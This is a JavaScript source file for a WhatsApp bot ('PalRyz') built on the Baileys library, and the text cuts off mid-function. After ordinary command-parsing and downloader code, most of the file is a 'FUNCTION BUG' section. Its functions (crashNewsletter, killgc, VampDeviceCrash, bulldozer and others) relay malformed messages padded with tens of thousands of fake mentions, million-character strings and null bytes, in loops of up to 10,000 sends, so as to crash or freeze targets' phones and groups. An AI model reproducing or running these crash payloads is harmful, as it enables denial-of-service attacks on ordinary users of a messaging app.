//========HELO FRIEND========//
require('./config')
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const fs = require('fs-extra')
const axios = require('axios')
const FormData = require('form-data')
const util = require('util')
const chalk = require('chalk')
const { addPremiumUser, delPremiumUser } = require("./lib/premiun");
const { getBuffer, getGroupAdmins, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/myfunction');
//===============
module.exports = PalRyz = async (PalRyz, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text : "");
const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
const isCmd = !!prefix;  
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = q = args.join(" ")//hard
const fatkuns = m.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
//======================
const botNumber = await PalRyz.decodeJid(PalRyz.user.id);
const premuser = JSON.parse(fs.readFileSync("./system/database/premium.json"));
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
if (!PalRyz.public && !isCreator) return;
//======================
const isGroup = m.chat.endsWith("@g.us");
const groupMetadata = isGroup ? await PalRyz.groupMetadata(m.chat).catch(() => ({})) : {};
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const isBotAdmins = groupAdmins.includes(botNumber);
const isAdmins = groupAdmins.includes(m.sender);
const groupName = groupMetadata.subject || "";
//======================
async function getBuffer(url) {
  const res = await axios.get(url, { responseType: 'arraybuffer' });
  return Buffer.from(res.data);
}
//======================
const cron = require('node-cron');
cron.schedule('0 0 * * *', async () => {
  // Taruh kode `archiver` di atas di dalam sini juga
  // Ganti `m.sender` dengan `ownerNumber + '@s.whatsapp.net'`
});
//=========
const CatBox = require('./lib/catbox.js'); // arahkan sesuai path file
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `𝐏𝐚𝐥𝐓𝐲𝐳 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭`,
'vcard': `BEGIN:VCARD\nVERSION:1.1.5\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6289526842547:+62 895-2684-2547\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
//======================
function randomDevice() {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
  let deviceId = ""
  for (let i = 0; i < 16; i++) {
    deviceId += chars.charAt(Math.floor(Math.random() * chars.length))
  }
  return deviceId
}
//=============
const palryz = {
  key: {
    participant: `0@s.whatsapp.net`,
    ...(botNumber ? {
      remoteJid: `status@broadcast`
    } : {})
  },
  message: {
    conversation: `🔥PalRyz New Era🔥`
  }
}
const palaj = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        "productMessage": {
          "product": {
            "productImage": {
              "mimetype": "image/jpeg",
              "jpegThumbnail": "",
            },
            "title": `Payment PalRyz`,
            "description": null,
            "currencyCode": "JPY",
            "priceAmount1000": "7750000",
            "retailerId": `Powered ${global.namabot}`,
            "productImageCount": 1
          },
          "businessOwnerJid": `0@s.whatsapp.net`
        }
      }
    }
//======================
if (m.message) {
PalRyz.readMessages([m.key]);
console.log("┏━━━━━━━━━━━━━━━━━━━━━━━=");
console.log(`┃¤ ${chalk.hex("#FFD700").bold("📩 NEW MESSAGE")} ${chalk.hex("#00FFFF").bold(`[${new Date().toLocaleTimeString()}]`)} `);
console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Dari:")} ${chalk.hex("#FFFFFF")(`${m.pushName} (${m.sender})`)} `);
console.log(`┃¤ ${chalk.hex("#FFA500")("📍 Di:")} ${chalk.hex("#FFFFFF")(`${groupName || "Private Chat"}`)} `);
console.log(`┃¤ ${chalk.hex("#00FF00")("📝 Pesan:")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}
//FUNCTION DOWNLOADER 
async function tiktok2(url) {
  let result = {};
  let body = new formData();
  body.append("q", url);
  body.append("lang", "id");

  try {
    let { data } = await axios("https://savetik.co/api/ajaxSearch", {
      method: "post",
      data: body,
      headers: {
        "content-type": "application/x-www-form-urlencoded",
        "User-Agent": "PostmanRuntime/7.32.2",
      },
    });
    let $ = cheerio.load(data.data);
    result.status = true;
    result.caption = $("div.video-data .tik-left .content h3").text();
    result.server1 = {
      quality: "MEDIUM",
      url: $("p:nth-child(1) > a").attr("href"),
    };
    result.serverHD = {
      quality: $("p:nth-child(3) > a").text().split("MP4 ")[1],
      url: $("p:nth-child(3) > a").attr("href"),
    };
    result.audio = $("p:nth-child(4) > a").attr("href");
  } catch {
    result.status = false;
    result.message = "Gagal parsing data.";
  }
  return result;
}
//FUNCTION BUG
async function InvisXAudioV2(target, mention) {
  const floods = 40000;
  const mentioning = "@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
    )
  ];
  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363375427625764@newsletter",
      serverMessageId: 1,
      newsletterName: "💧PalRyz 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐈𝐬 𝐇𝐞𝐫𝐞💧"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await PalRyz.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await PalRyz.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: "PalRyz Is Here"
        },
        content: undefined
      }]
    });
  }
}
async function loadedIos(target) {
    await PalRyz.sendMessage(target, {
        text: "🧪‌⃰Ꮡ‌‌" + "⛧ PalRyz :: CONCƱΣЯЯOR ⛧" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
        contextInfo: {
            externalAdReply: {
                title: "⛧ PalRyz :: CONCƱΣЯЯOR ⛧",
                body: `Haii ${pushname}`,
                previewType: "PHOTO",
                thumbnail: "",
                sourceUrl: "https://example.com/tama"
            }
        }
    }, { quoted: m });
}
async function callNewsletter(isTarget) {
await PalRyz.relayMessage(isTarget, {
callLogMesssage: { isVideo: true, callOutcome: "REJECTED", durationSecs: "1", callType: "VOICE_CHAT", participants: [{ jid: isTarget, callOutcome: "CONNECTED" }, { jid: "0@s.whatsapp.net", callOutcome: "CONNECTED" }]}
}, {})
}

async function crashNewsletter(isTarget) {
  const msg = generateWAMessageFromContent(isTarget, {
    interactiveMessage: {
      header: {
      documentMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
       mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
       fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
       fileLength: "9999999999999",
       pageCount: 9999999999999,
       mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
       fileName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟",
       fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
       directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
       mediaKeyTimestamp: 1735456100,
       contactVcard: true,
       caption: "F*ucking Everyone"
      }
     },
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: "trigger",
              order: {
                status: "flex_agency",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: "".repeat(10000) 
      }
   }
  }, { userJid: isTarget });

  await PalRyz.relayMessage(isTarget, msg.message, { 
    participant: { jid: isTarget },
    messageId: msg.key.id 
  });
}
async function blankgc(target) {
       PalRyz.relayMessage(target, {
             newsletterAdminInviteMessage: {
           newsletterJid: "120363370611316879@newsletter",
           newsletterName: "\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51" + "XxX".repeat(9000),
           caption: "ؙ\uD83D\uDC51 \u2022 \uD835\uDC7D\uD835\uDC86\uD835\uDC8F\uD835\uDC90\uD835\uDC8E\uD835\uDC6A\uD835\uDC90\uD835\uDC8D\uD835\uDC8D\uD835\uDC82\uD835\uDC83 8\uD835\uDC8C \u2022 \uD83D\uDC51\n" + "XxX".repeat(9000),
           inviteExpiration: "0",
          },
          }, {
            userJid: target
       })
       }

async function bug2(target) {
for (let i = 0; i <= 10000; i++) {
await InvisXAudioV2(target, mention);
await CrlSqL(target);
await FlowXNull(target);
}
console.log(chalk.blue(`Sending Bug Delay to ${target}☠️`));
} 

async function gcampas(target, Ptcp = true) {
      try {
        const msg = {
          botInvokeMessage: {
            message: {
              newsletterAdminInviteMessage: {
                newsletterJid: "33333333333333333@newsletter",
                newsletterName: "ZALISKING" + "ꦾ".repeat(120000),
                jpegThumbnail: "",
                caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                inviteExpiration: Date.now() + 1814400000
              }
            }
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            buttons: [{
              name: "call_permission_request",
              buttonParamsJson: "{}"
            }, {
              name: "galaxy_message",
              paramsJson: {
                screen_2_OptIn_0: true,
                screen_2_OptIn_1: true,
                screen_1_Dropdown_0: "nullOnTop",
                screen_1_DatePicker_1: "1028995200000",
                screen_1_TextInput_2: "null@gmail.com",
                screen_1_TextInput_3: "94643116",
                screen_0_TextInput_0: "".repeat(50000),
                screen_0_TextInput_1: "SecretDocu",
                screen_0_Dropdown_2: "#926-Xnull",
                screen_0_RadioButtonsGroup_3: "0_true",
                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }
            }]
          },
          contextInfo: {
            mentionedJid: Array.from({
              length: 5
            }, () => "0@s.whatsapp.net"),
            groupMentions: [{
              groupJid: "0@s.whatsapp.net",
              groupSubject: "Vampire Official"
            }]
          }
        };
        await PalRyz.relayMessage(target, msg, {
          userJid: target
        });
      } catch (err) {
        console.error("Error sending newsletter:", err);
      }
    }
    async function bulldozer(PalRyz, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await PalRyz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function rusuhgc(target) {
      try {
        const msg = {
          botInvokeMessage: {
            message: {
              newsletterAdminInviteMessage: {
                newsletterJid: "33333333333333333@newsletter",
                newsletterName: "Mode Rusuh😹" + "ꦾ".repeat(120000),
                jpegThumbnail: "",
                caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                inviteExpiration: Date.now() + 1814400000
              }
            }
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            buttons: [{
              name: "call_permission_request",
              buttonParamsJson: "{}"
            }, {
              name: "galaxy_message",
              paramsJson: {
                screen_2_OptIn_0: true,
                screen_2_OptIn_1: true,
                screen_1_Dropdown_0: "nullOnTop",
                screen_1_DatePicker_1: "1028995200000",
                screen_1_TextInput_2: "null@gmail.com",
                screen_1_TextInput_3: "94643116",
                screen_0_TextInput_0: "\0".repeat(500000),
                screen_0_TextInput_1: "SecretDocu",
                screen_0_Dropdown_2: "#926-Xnull",
                screen_0_RadioButtonsGroup_3: "0_true",
                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }
            }]
          },
          contextInfo: {
            mentionedJid: Array.from({
              length: 5
            }, () => "0@s.whatsapp.net"),
            groupMentions: [{
              groupJid: "0@s.whatsapp.net",
              groupSubject: "Vampire"
            }]
          }
        };
        await PalRyz.relayMessage(target, msg, {
          userJid: target
        });
      } catch (err) {
        console.error("Error sending newsletter:", err);
      }
    }
    async function killgc(target) {
      let massage = [];
      for (let r = 0; r < 1000; r++) {
        massage.push({
          fileName: "8kblA1s0k900pbLI6X2S6Y7uSr-r751WIUrQOt5-A3k=.webp",
          isAnimated: true,
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        });
      }
      const msg = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\0".repeat(1000000),
              version: 3
            },
            stickerPackMessage: {
              stickerPackId: "76cd3656-3c76-4109-9b37-62c8a668329f",
              name: "WOI GRUP KONTOL",
              publisher: "",
              stickers: massage,
              fileLength: "999999999999999",
              fileSha256: "NURKD/76ZOetxqc+V8dT/zJYRhpHZi9FYgAGNzdQQyM=",
              fileEncSha256: "/CkFScxebuRGVejPQ8NE0ounWX35rtq+PmkweWejtEs=",
              mediaKey: "AEkmhMTtPLPha2rHdxtWQtqXBH+g9Jo/+gUw1erHM9s=",
              directPath: "/v/t62.15575-24/29442218_1217419543131080_7836347641742653699_n.enc?ccb=11-4&oh=01_Q5Aa1QEZWzSJqGIwOUkeDSvpdnDSvVIvGUyVvW_uvgP5uTOePQ&oe=68403E51&_nc_sid=5e03e0",
              mediaKeyTimestamp: "99999999",
              trayIconFileName: "e846de1c-ff5f-4768-9ed4-a3ed1c531fe0.png",
              thumbnailDirectPath: "AjvV1BsQbp1IdsGb4sO/F1O8N6w60Pi2bgimTw/52KU=",
              thumbnailSha256: "qRcSAXa8fdBBSrYwhAf6Gg7PkjFPbpDqHCo/Keic5O8=",
              thumbnailEncSha256: "J7OubZTyLsE/VEQ8fRniRwyjB/fMfWbrCxXG0pGkgZ4=",
              thumbnailHeight: 99999999999,
              thumbnailWidth: 9999999999,
              imageDataHash: "OWY2MjQ0MmMzNGFhZThkOTY5YWM2M2RlMzAyNjg0OGNmZTBkMTMwNTBlYmE0YzAxNzhiMDdkMTBiNzM1NzdlYg==",
              stickerPackSize: 9999999999999,
              stickerPackOrigin: 9999999999999,
              contextInfo: {
                mentionedJid: Array.from({
                  length: 30000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                isSampled: true,
                participant: target,
                remoteJid: target,
                forwardingScore: 9741,
                isForwarded: true,
                businessMessageForwardInfo: {
                  businessOwnerJid: target
                },
                externalAdReply: {
                  title: "PalRyzISKING",
                  body: "Grup Kontol"
                }
              }
            }
          }
        }
      };
      await PalRyz.relayMessage(target, msg, {});
    }
    async function CrashJids(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target });

  await PalRyz.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}
async function FlowXNull(target) {
  const MSG = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "✩ 𐌍𐌀𐌕𐌀 ✦ Ꝋ𐌅𐌅𐌉𐌂𐌉𐌀𐌋 ✩",
            format: "DEFAULT",
            contextInfo: {
              mentionedJid: [
                target,
                "0@s.whatsapp.net",
                ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              ],
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING"
              },
            }
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",  
            paramsJson: "{".repeat(10000) + "}".repeat(10000), 
            version: 3
          }
        }
      }
    }
  };

  await PalRyz.relayMessage(target, MSG, {
    participant: { jid: target }
  });
}
async function CrlSqL(target) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { video: fs.readFileSync("./media/song.mp4") },
    { upload: PalRyz.waUploadToServer }
  );

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "FnX-" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "💥⃟༑⌁⃰𝐁𝐚𝐧𝐳𝐗 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲 🎭",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "Roxxie Pro AI Brodcast",
              body: "Trusted System",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://tama.example.com",
              showAdAttribution: false // trigger 1
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) // trigger 2
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "𒑡𝐁𝐚𝐧𝐳𝐗 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲 "
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "FnX" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
              externalAdReply: {
                title: "𝗧𝗛𝗘 𝗤𝗨𝗘𝗥𝗢𝗥",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://finix-ai.example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await PalRyz.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}
async function bug3(isTarget) {
for (let i = 0; i < 60; i++) {
await killgc(isTarget);
await rusuhgc(isTarget);
await gcampas(isTarget, Ptcp = true);
await blankgc(isTarget);
await CrlSqL(isTarget);
await FlowXNull(isTarget);
}
console.log(chalk.blue(`Sending Crash Hard to ${isTarget}☠️`));
}
async function bulldozer3(target) {
for (let i = 0; i < 600; i++) {
await bulldozer(target);
}
console.log(chalk.blue(`Sending Crash Hard to ${isTarget}☠️`));
}
async function VampSpam(langgxyz, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "Flixce Strom 🐍 🐍 Here",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await PalRyz.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function VampDeviceCrash(langgxyz, target) {
    await PalRyz.relayMessage(number, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Hi...I'm Flixce Strom 🐍",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target}});
}

async function VampPaymentCrash(target, Ptcp = true) {
    await PalRyz.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Flixce.biz.net",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "payment_transaction_request",
                        paramsJson: "\u0003".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target }});
}

async function VampDelayMess(langgxyz, target) {
    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "xnxxx.com",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Flixce Strom 🐍 🐍 Is Back\n" + "@062598121203".repeat(17000)
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "cta_url",
                            buttonParamsJson: "{ display_text: 'Flixce Strom 🐍 🐍 Bot', url: \"https://youtube.com/@iqbhalkeifer25\", merchant_url: \"https://youtube.com/@iqbhalkeifer25\" }"
                        }, {
                            name: "call_permission_request",
                            buttonParamsJson: "{}"
                        }],
                        messageParamsJson: "{}"
                    },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "xvideos.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await PalRyz.relayMessage(target, message, {
        participant: { jid: target }
    });
}

async function VampPrivateBlank(langgxyz, target) {
  const Vampire = `_*~@2~*_\n`.repeat(10500);
  const Private = 'ꦽ'.repeat(5000);

  const message = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
